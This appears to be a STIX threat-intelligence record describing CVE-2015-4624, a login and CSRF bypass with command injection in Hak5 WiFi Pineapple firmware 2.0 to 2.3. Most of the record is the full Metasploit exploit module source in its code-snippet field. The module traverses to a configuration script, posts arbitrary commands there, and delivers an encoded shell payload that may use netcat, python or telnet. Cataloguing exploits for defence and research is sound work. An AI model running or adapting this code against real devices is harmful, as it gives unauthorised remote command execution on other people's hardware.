{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6ff6306f-ccc9-47c1-97fe-60f73a2d0961",
    "created": "2024-08-14T17:04:20.305368Z",
    "modified": "2024-08-14T17:04:20.305372Z",
    "name": "Hak5 WiFi Pineapple Preconfiguration Command Injection",
    "description": " This module exploits a login/csrf check bypass vulnerability on WiFi Pineapples version 2.0 <= pineapple < 2.4. These devices may typically be identified by their SSID beacons of 'Pineapple5_....'; Provided as part of the TospoVirus workshop at DEFCON23. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/pineapple_bypass_cmdinject.rb",
            "external_id": "pineapple_bypass_cmdinject.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-4624"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Hak5 WiFi Pineapple Preconfiguration Command Injection',\n      'Description'    => %q{\n      This module exploits a login/csrf check bypass vulnerability on WiFi Pineapples version 2.0 <= pineapple < 2.4.\n      These devices may typically be identified by their SSID beacons of 'Pineapple5_....';\n      Provided as part of the TospoVirus workshop at DEFCON23.\n      },\n      'Author'         => ['catatonicprime'],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2015-4624' ]\n        ],\n      'Platform'       => ['unix'],\n      'Arch'           => ARCH_CMD,\n      'Privileged'     => false,\n      'Payload'        => {\n        'Space'        => 2048,\n        'DisableNops'  => true,\n        'Compat'       =>\n          {\n            'PayloadType' => 'cmd',\n            'RequiredCmd' => 'generic python netcat telnet'\n          }\n      },\n      'Targets'        =>\n        [\n          [ 'WiFi Pineapple 2.0.0 - 2.3.0', {} ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2015-08-01'))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, 'Path to the command injection', '/components/system/configuration/functions.php' ]),\n        Opt::RPORT(1471),\n        Opt::RHOST('172.16.42.1')\n      ]\n    )\n\n    deregister_options(\n      'ContextInformationFile',\n      'DOMAIN',\n      'DigestAuthIIS',\n      'EnableContextEncoding',\n      'FingerprintCheck',\n      'HttpClientTimeout',\n      'NTLM::SendLM',\n      'NTLM::SendNTLM',\n      'NTLM::SendSPN',\n      'NTLM::UseLMKey',\n      'NTLM::UseNTLM2_session',\n      'NTLM::UseNTLMv2',\n      'SSL',\n      'SSLVersion',\n      'VERBOSE',\n      'WORKSPACE',\n      'WfsDelay',\n      'Proxies',\n      'VHOST'\n    )\n  end\n\n  def cmd_uri\n    normalize_uri('includes', 'css', 'styles.php', '../../..', target_uri.path)\n  end\n\n  def cmd_inject(cmd)\n    res = send_request_cgi(\n      'method'     => 'POST',\n      'uri'        => cmd_uri,\n      'vars_get'   => {\n        'execute'  => \"\" # Presence triggers command execution\n      },\n      'vars_post'  => {\n        'commands' => cmd\n      })\n    res\n  end\n\n  def check\n    res = cmd_inject(\"echo\")\n    if res && res.code == 200 && res.body =~ /Executing/\n      return Exploit::CheckCode::Vulnerable\n    end\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    print_status('Attempting to bypass login/csrf checks...')\n    unless check\n      fail_with(Failure::NoAccess, 'Failed to bypass login/csrf check...')\n    end\n    print_status('Executing payload...')\n    cmd_inject(\"#{payload.encoded}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-08-01",
    "x_mitre_platforms": [
        "['unix']"
    ]
}